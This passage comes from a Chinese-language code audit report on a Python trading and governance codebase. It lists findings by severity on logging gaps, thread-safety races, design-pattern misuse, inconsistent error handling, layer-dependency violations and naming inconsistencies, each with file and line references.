+- 5.148.12 [HIGH]: [trading/auto_runtime_core.py:239-240,246-247](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L239) — 升级协议coldstart与EventBus订阅失败仅DEBUG(所有GATE_FAILED事件不触发升级)
+- 5.148.13 [HIGH]: [trading/boot_hooks.py:227,242](file:///D:/ZephyrAlpha/src/zephyr/trading/boot_hooks.py#L227) — RBAC就绪检查失败与RBAC审计签名失败均DEBUG(安全合规违规迹象不可见)
+
+#### 5.148.14-5.148.23 [MEDIUM] print替代logger+f-string性能+traceback丢失+格式不统一
+
+- 5.148.14 [MEDIUM]: [trading/__main__.py:48](file:///D:/ZephyrAlpha/src/zephyr/trading/__main__.py#L48) — Boot失败用print不走logger(Windows Service stdout可能丢失)
+- 5.148.15 [MEDIUM]: [governance/aisg_sandbox.py:166](file:///D:/ZephyrAlpha/src/zephyr/governance/aisg_sandbox.py#L166) — AISG沙箱安全测试失败用print(不入日志系统)
+- 5.148.16 [MEDIUM]: [shared/blueprint_decomposer.py:377,479,484,493,495](file:///D:/ZephyrAlpha/src/zephyr/shared/blueprint_decomposer.py#L377) — 5处f-string而非lazy %s(蓝图分解循环中浪费性能)
+- 5.148.17 [MEDIUM]: [infrastructure/capacity_assurance/risk_mitigation.py:42,54,84,275](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/capacity_assurance/risk_mitigation.py#L42) — 4处f-string(含retry循环内+Error Budget不变式违反)
+- 5.148.18 [MEDIUM]: [trading/autopilot.py:178](file:///D:/ZephyrAlpha/src/zephyr/trading/autopilot.py#L178) — f-string用于高频路径(每次任务认领的INFO日志)
+- 5.148.19 [MEDIUM]: [infrastructure/a2a_protocol/governance/audit_logger.py:34](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/a2a_protocol/governance/audit_logger.py#L34) — 审计日志高频路径f-string
+- 5.148.20 [MEDIUM]: [shared/state_machine.py:221,226,233](file:///D:/ZephyrAlpha/src/zephyr/shared/state_machine.py#L221) — 3处状态机副作用异常用logger.error但无exc_info(丢失traceback)
+- 5.148.21 [MEDIUM]: [ops/db_writer.py:84,117,145,174](file:///D:/ZephyrAlpha/src/zephyr/ops/db_writer.py#L84) — 4处DB写入失败用logger.error但无exc_info(约80+处`logger.error("...: %s", exc)`模式均无exc_info=True)
+- 5.148.22 [MEDIUM]: [trading/auto_runtime_core.py:177,183,196](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L177) — RBAC bootstrap/shutdown 3处logger.error无exc_info
+- 5.148.23 [MEDIUM]: 跨多文件——日志前缀格式三套并存(`[XXX]`/`Module:`/无前缀)，日志采集系统过滤规则复杂化
+
+#### 5.148.24-5.148.27 [LOW] 聚合缺失+配置不可见+重复代码
+
+- 5.148.24 [LOW]: [infrastructure/system_telemetry/metrics_bridge.py:194](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/metrics_bridge.py#L194) — 循环内每个被丢弃metric单独WARNING(100个metrics产生100条日志洪水)
+- 5.148.25 [LOW]: [trading/auto_runtime_core.py:118-157](file:///D:/ZephyrAlpha/src/zephyr/trading/auto_runtime_core.py#L118) — boot()全程无INFO输出启动配置(poll_interval/auto_start_l2/ollama_base_url)
+- 5.148.26 [LOW]: infrastructure/audit_logger.py与integration/mcp/audit_logger.py两份实现完全重复(同构耦合)
+- 5.148.27 [LOW]: [trading/boot_hooks.py:77,85,98,107,115,123,130,138](file:///D:/ZephyrAlpha/src/zephyr/trading/boot_hooks.py#L77) — 8处监控组件init失败的WARNING均未说明后续动作
+
+**核心债务特征**：13个HIGH中9个是except:pass静默吞没关键失败(服务注册/auto_bootstrap/审计链/防篡改审计/资源监控/上下文检索/升级协议/RBAC审计/审计core_writer)，构成"自动系统静默失效"系统性反模式——违反项目硬约束"永久系统必须全自动"
+
+**严重度汇总**：HIGH=13, MEDIUM=10, LOW=4, 合计=27
+
+---
+
+### 5.149 线程安全集合使用（25个，第25轮新增）
+
+审查dict/list/set在多线程环境下的非原子操作、check-then-act竞态、Queue使用错误、collections误用等问题。
+
+#### 5.149.1-5.149.12 [HIGH] 无锁单例+check-then-act共享dict+subscribers list迭代与append竞态
+
+- 5.149.1 [HIGH]: [behavioral_audit/drift_infrastructure.py:109-118](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/drift_infrastructure.py#L109) — 模块级`_budgets`全局dict在`get_or_create_budget`中check-then-act竞态
+- 5.149.2 [HIGH]: [behavioral_audit/drift_infrastructure.py:333-349](file:///D:/ZephyrAlpha/src/zephyr/behavioral_audit/drift_infrastructure.py#L333) — 模块级`_partial_deployments`同上+对已存在记录的is_stalled字段修改无锁
+- 5.149.3 [HIGH]: [shared/event_bus.py:95-134](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L95) — EventBus单例无锁check-then-act；subscribe的append与publish的迭代并发触发RuntimeError: list changed size during iteration(同文件EventBusBackpressure正确使用锁，此处遗漏)
+- 5.149.4 [HIGH]: [shared/event_bus.py:256-261](file:///D:/ZephyrAlpha/src/zephyr/shared/event_bus.py#L256) — emit在锁内append后锁外读取并迭代_handlers(锁外迭代期间unsubscribe触发list.remove抛RuntimeError)
+- 5.149.5 [HIGH]: [autonomy_core/skill_prompt_cache.py:37,49-64,67-70,73-77](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/skill_prompt_cache.py#L37) — 类级_cache被所有实例/线程共享，所有classmethod均无锁(get中del与并发set竞态+set中len后purge_expired是check-then-act)
+- 5.149.6 [HIGH]: [integration/pipeline_orchestrator.py:1622,1635-1637,1650](file:///D:/ZephyrAlpha/src/zephyr/integration/pipeline_orchestrator.py#L1622) — `_metrics`的get+1非原子读-改-写+_latency_samples的check-then-act+_failure_log同类问题(行851/862/1088/1091/1248/1249)
+- 5.149.7 [HIGH]: [trading/orchestrator/agent_quality.py:22-28](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/agent_quality.py#L22) — AgentQualityTracker无任何锁，record的check-then-act在并发下可能创建两个空list覆盖
+- 5.149.8 [HIGH]: [infrastructure/capacity_assurance/modules/graceful_shutdown.py:40,55-62](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/capacity_assurance/modules/graceful_shutdown.py#L40) — register_handler在主线程append，run_handlers在信号处理线程迭代，无锁
+- 5.149.9 [HIGH]: [infrastructure/pipeline/backpressure_manager.py:215-221,223-229](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/pipeline/backpressure_manager.py#L215) — 锁使用不一致：handle_pause/clear在锁内操作_on_pause_handlers，但register_on_pause在锁外append
+- 5.149.10 [HIGH]: [infrastructure/capacity_assurance/modules/config_reload_semantic.py:35-56](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/capacity_assurance/modules/config_reload_semantic.py#L35) — watch修改_watched/_callbacks，check_and_reload迭代两者，均无锁
+- 5.149.11 [HIGH]: [shared/events/hook_dispatcher.py:63-77,95-105](file:///D:/ZephyrAlpha/src/zephyr/shared/events/hook_dispatcher.py#L63) — register_hook与_on_event并发执行时append与迭代竞态+_executions的append无锁
+- 5.149.12 [HIGH]: [infrastructure/system_telemetry/metrics_bridge.py:162-171](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/system_telemetry/metrics_bridge.py#L162) — 无锁单例(对比同项目resource_optimization.py/ops/scheduler.py/database_manager.py均使用双重检查锁定，此处遗漏)
+
+#### 5.149.13-5.149.23 [MEDIUM] 无锁单例+Queue.qsize+模块级REGISTRY无锁+BM25索引竞态
+
+- 5.149.13 [MEDIUM]: [autonomy_core/context_evictor.py:97-98](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/context_evictor.py#L97) — 无锁单例(对比同项目management/context_evictor.py:240-244已正确加锁)
+- 5.149.14 [MEDIUM]: [infrastructure/observability/trace_decorator.py:57-58](file:///D:/ZephyrAlpha/src/zephyr/infrastructure/observability/trace_decorator.py#L57) — 无锁单例
+- 5.149.15 [MEDIUM]: [governance/audit_trail/cold_start.py:36-39](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_trail/cold_start.py#L36) + audit_orchestrator/cold_start.py:35-38 — 无锁__new__单例
+- 5.149.16 [MEDIUM]: [integration/local_model/local_model_scheduler.py:138-139](file:///D:/ZephyrAlpha/src/zephyr/integration/local_model/local_model_scheduler.py#L138) — pending_count用Queue.qsize()(CPython文档明确"Not reliable")
+- 5.149.17 [MEDIUM]: [governance/audit_orchestrator/resource_aware_pool.py:75,77](file:///D:/ZephyrAlpha/src/zephyr/governance/audit_orchestrator/resource_aware_pool.py#L75) + audit_trail/resource_aware_pool.py:75,77 — 直接访问ThreadPoolExecutor私有_work_queue并调用qsize()+_cpu_futures迭代无锁
+- 5.149.18 [MEDIUM]: [governance/git_commit_gateway.py:527,725](file:///D:/ZephyrAlpha/src/zephyr/governance/git_commit_gateway.py#L527) — os.environ在多线程提交场景下对同一环境变量写入(进程级全局无法区分哪次commit)
+- 5.149.19 [MEDIUM]: [autonomy_core/registry.py:63,85-110](file:///D:/ZephyrAlpha/src/zephyr/autonomy_core/registry.py#L63) — AgentSpecRegistry的register/list_all/reload均无锁(reload的clear()与list_all的.items()迭代并发触发RuntimeError)
+- 5.149.20 [MEDIUM]: [governance/rule_enforcement/circuit_breaker.py:501,535,547](file:///D:/ZephyrAlpha/src/zephyr/governance/rule_enforcement/circuit_breaker.py#L501) — 模块级_L08_REGISTRY在运行时通过register_compliance写入，get_compliance读取，均无锁
+- 5.149.21 [MEDIUM]: [integration/vector_memory/bm25_index.py:56-59](file:///D:/ZephyrAlpha/src/zephyr/integration/vector_memory/bm25_index.py#L56) + hybrid_retriever.py:117-120 — BM25索引_term_freqs/_doc_freqs在add/index方法中读-改-写无锁(两文件同名实现，问题重复)
+- 5.149.22 [MEDIUM]: [integration/vector_memory/retrieval_feedback.py:91](file:///D:/ZephyrAlpha/src/zephyr/integration/vector_memory/retrieval_feedback.py#L91) — `_long_tail`计数器无锁读-改-写(并发track同一query丢失计数)
+- 5.149.23 [MEDIUM]: [integration/layer_router.py:246,261](file:///D:/ZephyrAlpha/src/zephyr/integration/layer_router.py#L246) — LayerDataRouter的_consumers在register_consumer中setdefault+append，在route中迭代调用，无锁+_route_history的append无锁
+
+#### 5.149.24-5.149.25 [LOW] 整体替换引用致update_load操作过期快照+PatternRegistry潜在竞态
+
+- 5.149.24 [LOW]: [trading/orchestrator/agent_orchestrator.py:354-355,359-362,430](file:///D:/ZephyrAlpha/src/zephyr/trading/orchestrator/agent_orchestrator.py#L354) — register通过整体替换self._pool引用"避免"修改中迭代，但update_load迭代旧引用时register已替换为新list，current_load更新丢失
+- 5.149.25 [LOW]: [security/llm_defense/llm_security/patterns/__init__.py:30-37](file:///D:/ZephyrAlpha/src/zephyr/security/llm_defense/llm_security/patterns/__init__.py#L30) — PatternRegistry的_patterns在register中append，当前match返回空列表未迭代(未来实现遍历时与register竞态)
+
+**N/A维度**：threading.local未清理(已在5.132覆盖)、itertools.chain(全项目无使用)、WeakValueDictionary/WeakKeyDictionary(全项目无使用)、functools.lru_cache多线程首次填充(全项目无@lru_cache)
+
+**核心模式总结**：(1)无锁单例4处(CN-012~CN-015)均遗漏双重检查锁定；(2)check-then-act on shared dict 5处(CN-001/002/005/006/007)核心业务路径全局/类级dict竞态；(3)锁使用不一致2处(CN-004/009)比完全无锁更危险；(4)subscribers/handlers list迭代与append竞态4处(CN-003/008/010/011)观察者模式通病
+
+**严重度汇总**：HIGH=12, MEDIUM=11, LOW=2, 合计=25
+
+---
+
+### 5.150 设计模式误用（17个，第26轮新增）
+
+#### HIGH（5个）
+
+1. **[HIGH]** `src/zephyr/trading/resource_optimization.py:260` — **God Class**：`ResourceOptimizationEngine` 单例含约39个方法、880+行，承担7+职责（压力状态机/熔断器/缓存管理/进程池/监控循环/自愈策略/配置加载/审计），`_execute_*`系列8个方法+`get_*`系列7个方法混在一类
+2. **[HIGH]** `src/zephyr/trading/auto_runtime_core.py:65` — **God Class**：`AutoRuntimeCore` 含约42个方法、672行，承担9+职责（boot/shutdown/RBAC/Ollama管理/任务队列/blueprint watcher/FLE scheduler/model router/A2A/任务学习）
+3. **[HIGH]** `src/zephyr/ops/scheduler.py:96` — **God Class**：`FeedbackLoopScheduler` 含26个方法、520+行，注入19+依赖，承担collect→detect→diagnose→act→verify全链路+drift scan+safety gates+alerting+metrics 6+职责
+4. **[HIGH]** `src/zephyr/pf_core/default_equity_strategy.py:93` — **Refused Bequest/LSP违反**：`generate_target_weights(self) -> list[Order]` 完全不兼容父类 `StrategyBase.generate_target_weights(self, universe, signals, constraints) -> dict[str, float]`（参数0 vs 3，返回类型list vs dict）；`on_fill(self)`/`on_risk_alert(self)` 也丢弃父类参数
+5. **[HIGH]** `src/zephyr/trading/trading_contracts/factories.py:109` — **Long Parameter List**：`make_risk_metrics_report` 含16个参数，远超7阈值，直接源于Data Class反模式
+
+#### MEDIUM（9个）
+
+6. **[MEDIUM]** `src/zephyr/trading/trading_contracts/risk/risk_metrics.py:25` — **Data Class**：`RiskMetricsReport` 为`@dataclass(frozen=True)`，含17个字段但0个方法，无任何验证/计算/封装行为
+7. **[MEDIUM]** `src/zephyr/trading/action_dispatcher.py:90` — **God Class**：`ActionDispatcher` 含22个方法、753行，承担文件修改/注释标注/模块发现/brain block管理/triage日志 5+职责
+8. **[MEDIUM]** `src/zephyr/trading/trading_contracts/risk/risk_limit_violation_error.py:34` — **Bloated Constructor**：`__init__` 含10个keyword-only参数；且`TraceContext`类型注解未导入，运行时`get_type_hints`会失败
+9. **[MEDIUM]** `src/zephyr/trading/gpu_consensus_scheduler.py:157` — **Bloated Constructor**：`__init__` 含8个参数；附带bug：第169/179行`local - model`（应为`local_model`）导致`NameError`
+10. **[MEDIUM]** `src/zephyr/trading/trading_contracts/factories.py:57` — **Long Parameter List**：`make_risk_limits` 含9个参数
+11. **[MEDIUM]** `src/zephyr/trading/trading_contracts/factories.py:84` — **Long Parameter List**：`make_risk_dashboard_snapshot` 含9个参数
+12. **[MEDIUM]** `src/zephyr/trading/orchestrator/agent_orchestrator.py:1` ↔ `core/agent_orchestrator.py:1` — **Shotgun Surgery**：两份近乎完全相同的`AgentOrchestrator`实现（同一module_id/BLUEPRINT/docstring），任一改动需双写
+13. **[MEDIUM]** `src/zephyr/trading/orchestrator/hallucination_detector.py:1` ↔ `resilience/hallucination_detector.py:1` — **Shotgun Surgery**：两份完全相同的`HallucinationDetector` CoVe检测器（同一BLUEPRINT/Task ID/docstring逐字一致）
+14. **[MEDIUM]** `src/zephyr/pf_core/strategy_portfolio.py:1` ↔ `governance/financial_governance/strategy_portfolio.py:1` — **Shotgun Surgery**：两份完全相同的`StrategyMethod`/`RetirementTrigger`枚举+`estimate_capacity`函数
+
+#### LOW（3个）
+
+15. **[LOW]** `src/zephyr/pf_core/strategies/default_equity_strategy.py:1` ↔ `pf_core/default_equity_strategy.py:1` — **Shotgun Surgery**：同#4的`DefaultEquityStrategy`在两处重复实现
+16. **[LOW]** `src/zephyr/security/llm_defense/llm_security/layers/l8_multi_agent.py:107` — **Primitive Obsession**：`AgentCommunicationItem.__init__` 含7个`str`基本类型参数，`source_id`/`sender_id`、`target_id`/`receiver_id`互为别名冗余，未用`AgentId`值对象封装
+17. **[LOW]** `src/zephyr/pf_core/strategy_portfolio.py:23` — **Dead Class**：`StrategyMethod`/`RetirementTrigger`枚举与`estimate_capacity`函数仅被tests引用，生产代码`[CONSUMERS]`为空
+
+**核心模式总结**：(1)God Class 3处集中在trading/ops核心域，方法数26-42，职责6-9个；(2)Shotgun Surgery 4处均为"同包内两份逐字重复实现"；(3)Long Parameter List 3处均在factories.py，源于Data Class反模式
+
+**严重度汇总**：HIGH=5, MEDIUM=9, LOW=3, 合计=17
+
+---
+
+### 5.151 错误处理策略一致性（11个，第26轮新增）
+
+#### HIGH（3个）
+
+1. **[HIGH]** `src/zephyr/behavioral_audit/git_bisector.py:117` — `finally:`块直接执行`subprocess.run(["git","checkout","-"], ...)` 而无try/except包裹。若subprocess抛`TimeoutExpired`/`FileNotFoundError`，将**掩盖try块中正在传播的异常**，并使仓库停留在bisect的分离HEAD状态
+2. **[HIGH]** `src/zephyr/trading/zombie_scanner.py:209,220` — `except (psutil.NoSuchProcess, psutil.AccessDenied, Exception): continue`。将宽泛`Exception`与特定异常并列，特定异常被完全遮蔽，等价于`except Exception:`，会吞掉`AttributeError`/`TypeError`等Bug
+3. **[HIGH]** `src/zephyr/trading/verdict_engine.py:250-251` — `protection_index.query(target_path)`解析失败被`except Exception: pass`静默吞没。protection_level是安全判决关键输入，失败后继续走决策树。同模块`_eval_one`(line 345-351)将评估异常显式转为RED verdict——**安全路径上同类异常采用不同策略**
+
+#### MEDIUM（5个）
+
+4. **[MEDIUM]** `src/zephyr/integration/shared/events/dlq.py:154-159` — `_failure_handler`内`raise RuntimeError(...)`后立刻`except Exception: pass`。"先抛后吞"且**无任何日志**，该handler已注册到事件总线，所有DLQ事件在此处被完全静默丢弃
+5. **[MEDIUM]** `src/zephyr/shared/foundation/errors.py:125` — `class IOError(ZephyrBaseError):` 覆盖Python内建`IOError`（自3.3起为`OSError`别名）。经`shared/errors.py:25`再导出，任何`from zephyr.shared.errors import *`的模块都会丢失内建`IOError`，破坏`except OSError:`与`IOError`的同义关系（项目内已有15处`except OSError`）
+6. **[MEDIUM]** `src/zephyr/trading/zombie_scanner.py:107,117,126,276` — 同一文件内对同类IO/系统调用错误采用4种不同策略：`_load_patterns`静默pass / `_save_patterns`记warning / `_log_kill`静默pass（杀进程日志丢失）/ `_kill_process`内层静默pass
+7. **[MEDIUM]** `src/zephyr/autonomy_core/context_assembler.py:481,485,489,493` — 连续4个`_safe_search(...)`调用均`except Exception: pass`静默吞没（ke_entries/vibe_rules/blueprints/failure_patterns四类检索），而同模块line 608-609对类似KB搜索失败用`_logger.debug`记录
+8. **[MEDIUM]** `src/zephyr/integration/vector_memory/index_health_monitor.py:88,157,167` vs `:176-177` — TTL过期扫描中解析失败(157)与collection读取失败(167)全部`except Exception: pass`静默；而同类`auto_repair`失败却`_logger.error`并`return False`。同一类内三种策略混用
+
+#### LOW（3个）
+
+9. **[LOW]** `src/zephyr/trading/zombie_scanner.py:264-280` — `_kill_process`内层`except Exception: pass`(276)会吞掉`AccessDenied`/`NoSuchProcess`之外的异常，使函数返回`True`（"完全成功"），而实际kill链路可能只完成一半
+10. **[LOW]** `src/zephyr/autonomy_core/engine.py:205,293` — discover阶段(205)与upgrade阶段(293)均用`except Exception: pass`静默吞没；同模块line 131/173/217/246使用`except Exception as exc:`显式记录。同类phase处理在不同方法中策略不一致
+11. **[LOW]** `scripts/governance/_sync/fix_orphan_deps.py:65,131` — 两处裸`except:`捕获所有异常（包括`KeyboardInterrupt`/`SystemExit`），将`json.loads`失败静默降级为`deps=[]`。与项目其他位置普遍使用`except Exception`的策略不一致
+
+**核心模式总结**：(1)同类IO/检索/系统调用错误在同一模块内混用"pass/warning/error/return None"多种策略——zombie_scanner(4种)、context_assembler(2种)、index_health_monitor(3种)；(2)安全关键路径(verdict_engine/zombie_scanner/dlq)出现静默吞没影响审计与法证能力；(3)自定义IOError覆盖内建是潜在"地雷"
+
+**严重度汇总**：HIGH=3, MEDIUM=5, LOW=3, 合计=11
+
+---
+
+### 5.152 依赖方向违规（39个，第26轮新增）
+
+#### HIGH（5个：底层依赖高层/循环依赖）
+
+1. **[HIGH]** `src/zephyr/shared/contracts/order.py:8-10` — shared契约层（最底层）从`zephyr.trading.trading_contracts.execution.order`导入`OrderSide/OrderStatus/OrderType`。底层contracts依赖业务域trading，方向完全反了——枚举真源应下沉到shared
+2. **[HIGH]** `src/zephyr/shared/contracts/protocols.py:31` — shared契约层从`zephyr.governance.rule_enforcement.gate_types`导入`GateResult`。该文件自称"用Protocol打破双向依赖"，却直接依赖governance具体类型，构成`shared→governance→integration→governance`循环
+3. **[HIGH]** `src/zephyr/shared/foundation/constants.py:45` — shared.foundation（项目最底层基础层）从`zephyr.governance.escalation_models`导入`EscalationLevel`。foundation不应向上依赖任何业务/治理层
+4. **[HIGH]** `src/zephyr/shared/blueprint_decomposer.py:45-46` — shared层从`zephyr.integration.shared.schema.execution_model/severity_types`导入`ExecutionModel/Priority/SafetyLevel`。底层依赖中层integration，且integration.shared.schema.schemas:26又向上依赖governance，形成shared→integration→governance传递性上层依赖
+5. **[HIGH]** `src/zephyr/shared/contracts/runtime_types.py:24` — shared契约层从`zephyr.integration.shared.schema.schemas`导入`BASE_CONFIG`。底层contracts依赖integration层
+
+#### MEDIUM（25个：跨层依赖）
+
+**governance → 业务域（autonomy_core/pf_core/trading）— 8个**
+
+6. **[MEDIUM]** `src/zephyr/governance/budget_enforcement.py:17` — governance→autonomy_core（导入`BudgetEnforcer`）
+7. **[MEDIUM]** `src/zephyr/governance/context_budget.py:47` — governance→autonomy_core（导入`DEFAULT_CONTEXT_TOKEN_BUDGET/estimate_tokens`）
+8. **[MEDIUM]** `src/zephyr/governance/strategy_engine/__init__.py:21` — governance→pf_core（导入default_equity_strategy）
+9. **[MEDIUM]** `src/zephyr/governance/adapters/simulation_broker.py:54-56` — governance→trading（导入`Fill/Order/PositionSnapshot`）
+10. **[MEDIUM]** `src/zephyr/governance/analytics_base.py:49-51` — governance→trading（导入`ExecutionReport/Fill/Order`）
+11. **[MEDIUM]** `src/zephyr/governance/broker_interface.py:40-42` — governance→trading（导入`Fill/Order/PositionSnapshot`）
+12. **[MEDIUM]** `src/zephyr/governance/default_tca_engine.py:43-45` — governance→trading（导入`ExecutionReport/Fill/Order`）
+13. **[MEDIUM]** `src/zephyr/governance/strategies/default_equity_strategy.py:50` — governance→trading（导入`Order/OrderSide/OrderType`）
+
+**infrastructure → governance — 5个**
+
+14. **[MEDIUM]** `src/zephyr/infrastructure/rollback/auditor.py:26` — infrastructure→governance（导入`AuditWriter`）
+15. **[MEDIUM]** `src/zephyr/infrastructure/rollback/contracts.py:26` — infrastructure→governance（导入`AnomalyResult`）
+16. **[MEDIUM]** `src/zephyr/infrastructure/rollback/governance/auditor.py:22` — infrastructure→governance（导入`AuditWriter`）
+17. **[MEDIUM]** `src/zephyr/infrastructure/rollback/governance/contracts.py:22` — infrastructure→governance（导入`AnomalyEvent`）
+18. **[MEDIUM]** `src/zephyr/infrastructure/a2a_protocol/legacy_auditor.py:26` — infrastructure→governance（导入`AuditWriter`）
+
+**integration → governance/autonomy_core/trading — 7个**
+
+19. **[MEDIUM]** `src/zephyr/integration/llm_bridge.py:29` — integration→governance（导入`LLMFixResult`）
+20. **[MEDIUM]** `src/zephyr/integration/shared/schema/schemas.py:26,265` — integration.shared.schema（号称SSoT的schema底座）→governance（导入`TaskNamespace`），SSoT层向上依赖治理层
+21. **[MEDIUM]** `src/zephyr/integration/vector_memory/delegated_vector_memory.py:37` — integration→governance（导入`UnifiedMemoryAPI`）
+22. **[MEDIUM]** `src/zephyr/integration/vector_memory/__init__.py:53` — integration→governance（导入unified_memory_api）
+23. **[MEDIUM]** `src/zephyr/integration/mcp/sentinel_server.py:51` — integration→autonomy_core（导入`IntentDomain`）
+24. **[MEDIUM]** `src/zephyr/integration/mcp/task_manager_server.py:36` — integration→governance（导入`TaskNamespace`）
+25. **[MEDIUM]** `src/zephyr/integration/behavioral_admission/admission_response.py:23` — integration→trading
+
+**ops → governance/trading — 5个**
+
+26. **[MEDIUM]** `src/zephyr/ops/analytics_base.py:48` — ops→governance（导入`PerformanceAttributionReport`）
+27. **[MEDIUM]** `src/zephyr/ops/analytics_base.py:49-51` — ops→trading（导入`ExecutionReport/Fill/Order`）
+28. **[MEDIUM]** `src/zephyr/ops/db_bridge.py:31` — ops→governance（导入`get_db_connection`）
+29. **[MEDIUM]** `src/zephyr/ops/db_writer.py:28` — ops→governance（导入`get_db_connection`）
+30. **[MEDIUM]** `src/zephyr/ops/gates/safety_gate_l66_l67.py:30` — ops→governance（导入`write_to_core`）
+
+#### LOW（9个：shim/代理re-export轻微违规）
+
+**shared → ops 的re-export shim — 5个**
+
+31. **[LOW]** `src/zephyr/shared/health.py:25` — `from zephyr.ops.observability.health import *`
+32. **[LOW]** `src/zephyr/shared/logging.py:25` — `from zephyr.ops.observability.logging import *`
+33. **[LOW]** `src/zephyr/shared/metrics.py:25` — `from zephyr.ops.observability.metrics import *`
+34. **[LOW]** `src/zephyr/shared/tracing.py:25` — `from zephyr.ops.observability.tracing import *`
+35. **[LOW]** `src/zephyr/shared/zephyr_logger.py:16` — `from zephyr.ops.observability.logging import (...)`
+
+**shared → infrastructure 的代理模块 — 4个**
+
+36. **[LOW]** `src/zephyr/shared/lifecycle/task_lifecycle_manager.py:17` — 代理到`zephyr.infrastructure.lifecycle.task_lifecycle_manager`
+37. **[LOW]** `src/zephyr/shared/lifecycle/scope_guard.py:17` — 代理到`zephyr.infrastructure.lifecycle.scope_guard`
+38. **[LOW]** `src/zephyr/shared/queue/task_scheduler.py:17` — 代理到`zephyr.infrastructure.queue.task_scheduler`
+39. **[LOW]** `src/zephyr/shared/reliability/context_guard.py:17` — 代理到`zephyr.infrastructure.reliability.context_guard`
+
+**核心模式总结**：(1)5处HIGH均为shared底层(最底层)向上依赖trading/governance/integration——类型真源未下沉到shared；(2)25处MEDIUM集中在governance→trading(8处，多为trading_contracts re-export)、infrastructure→governance(5处，audit_trail类型)、integration→governance(7处)、ops→governance(5处)；(3)governance/trading_contracts/下30+文件全部为re-export shim属规模化现象；(4)已有修复痕迹(shared/infra_06/注释"P3治本:改引同层真源,消除循环")证明历史确有循环依赖
+
+**严重度汇总**：HIGH=5, MEDIUM=25, LOW=9, 合计=39
+
+---
+
+### 5.153 命名一致性（21个，第26轮新增）
+
+#### HIGH（4个：误导性命名）
+
+1. **[HIGH]** `scripts/governance/dm105_depgraph_triage.py:102` — `def load_depgraph(db_path)` 参数`db_path`完全未使用，函数体直接调用`get_depgraph_pg_connection(autocommit=True)`(PostgreSQL)。参数名暗示SQLite路径连接但实际使用PG，违反depgraph必须为PostgreSQL的硬约束
+2. **[HIGH]** `scripts/governance/dm105_depgraph_triage.py:124` — `def save_depgraph(data, db_path)` 参数`db_path`同样未使用（直接调用`get_depgraph_pg_connection`），同上误导
+3. **[HIGH]** `scripts/governance/generate_project_depgraph.py:2611` — `def write_depgraph_to_db(depgraph, db_path, design_state=None)` 函数名`write_..._to_db`+`db_path`参数双重暗示SQLite路径写入，但实际使用PostgreSQL，且`db_path`参数完全未使用
+4. **[HIGH]** `src/zephyr/trading/admission_controller.py:74,83` — 同一字段名`circuit_open`在`AdmissionResult`(line 74，bool状态标志：电路是否开启)与`AdmissionMetrics`(line 83，int计数器：电路开启次数)中语义完全不同，同文件内同名异义
+
+#### MEDIUM（10个：不一致）
+
+5. **[MEDIUM]** `scripts/governance/dm105_depgraph_triage.py:102` vs `diagnose_depgraph.py:61` — 两个同名`load_depgraph`函数签名不同：`(db_path)` vs `()`
+6. **[MEDIUM]** `dm105_depgraph_triage.py:124`(`save_depgraph`) vs `generate_project_depgraph.py:2611`(`write_depgraph_to_db`) — 同一动作使用两种动词+名词组合
+7. **[MEDIUM]** `src/zephyr/ops/db_bridge.py:79,111`(`record_via_db_contract`) vs `db_writer.py:48,181`(`write_metrics`) — 同一目录下两个模块都向`fle_metrics`表写入，使用`record` vs `write`两种动词；且db_bridge硬编码`"data/databases/governance.db"`，db_writer通过`get_db_connection()` SSoT调用
+8. **[MEDIUM]** `database_service.py:75,82,92`(`get_governance_conn`/`get_depgraph_conn`/`get_market_conn`) vs `database_manager.py:197`+`ports.py:42`(`get_connection`) vs `sqlite_schema.py:457`(`get_db_connection`) vs `depgraph_schema.py:1170`(`get_depgraph_pg_connection`) — 获取数据库连接使用`conn`缩写与`connection`全称混用，以及4种命名模式
+9. **[MEDIUM]** `audit_orchestration/session_manager.py:106` vs `state/session_manager.py:113` — 同包内两个`create_session`方法参数名不同（`session_id` vs `task_id`），返回类型不同（`str` vs `Self`）；`trading/orchestrator/session_manager.py:106` vs `state/session_manager.py:113`同；`infrastructure/a2a_protocol/governance/session_manager.py:21`使用第三种参数名`agent_id`
+10. **[MEDIUM]** `src/zephyr/governance/database_service.py:72` — `self.WRITE_LOCK_TIMEOUT = 5.0` 实例属性使用UPPER_CASE常量命名风格，混淆实例属性与类/模块常量
+11. **[MEDIUM]** `src/zephyr/infrastructure/capacity_assurance/contracts/batch1_infra.py:23` + `batch2_governance.py:23` + `batch3_integration.py:23` — 类名如`CT_SLO_001`/`CT_OT_001`/`CT_GD_004`/`CT_CR_001`等共~40个类使用SCREAMING_SNAKE_CASE而非Python惯例的PascalCase
+12. **[MEDIUM]** `src/zephyr/infrastructure/capacity_assurance/__init__.py:36-37` + `modules/__init__.py:74-75` — 模块级常量`version = "2.6.0"`与`module_id = "MOD-INF-001"`使用小写命名；项目其他模块(25+处)统一使用`__version__`双下划线约定
+13. **[MEDIUM]** `src/zephyr/ops/observability/logging.py:285` + `shared/observability_02/logging.py:285` — `def TraceContext(...)` 是`@contextmanager`装饰的函数，但使用PascalCase命名。Python惯例函数应snake_case
+14. **[MEDIUM]** `src/zephyr/governance/slo_contract.py:400` — `def BudgetTier_ordering(tier: BudgetTier) -> int` 使用混合PascalCase_snake_case命名，应为`budget_tier_ordering`
+
+#### LOW（7个：风格问题）
+
+15. **[LOW]** `src/zephyr/signal_fundamental/pipeline.py:128` — `self._BUILTINS_GUARD_ENABLED: bool = True` 实例属性使用UPPER_CASE常量命名；同时布尔属性缺少`is_`前缀
+16. **[LOW]** `src/zephyr/governance/auto_runner.py:60` — `@property def success(self) -> bool:` 布尔属性缺少`is_`前缀
+17. **[LOW]** `src/zephyr/governance/api_lifecycle.py:48` — `@property def expired(self) -> bool:` 布尔属性缺少`is_`前缀
